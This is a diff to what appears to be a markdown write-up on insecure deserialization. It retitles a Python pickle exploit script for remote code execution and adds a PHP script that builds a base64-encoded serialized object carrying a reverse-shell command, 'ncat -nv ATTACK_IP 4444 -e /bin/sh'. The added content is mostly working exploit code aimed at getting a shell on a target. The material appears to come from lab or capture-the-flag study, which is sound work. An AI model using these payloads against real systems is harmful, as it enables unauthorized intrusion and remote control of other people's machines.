@@ -29,7 +29,7 @@ pickle.loads(base64.b64decode(s))
 
 <figure><img src="../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>
 
-Exploit Script To RCE
+Exploit Script To RCE using Python .
 
 ```
 import pickle
@@ -44,6 +44,21 @@ class RCE:
 if __name__ == '__main__':
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
+```
+
+Exploit Script To RCE using PHP .
+
+```
+<?php
+class MaliciousUserData {
+public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
+}
+
+$maliciousUserData = new MaliciousUserData();
+$serializedData = serialize($maliciousUserData);
+$base64EncodedData = base64_encode($serializedData);
+echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
+?>
 ```
 
 Running the script gives me the following base64 encoded pickle:
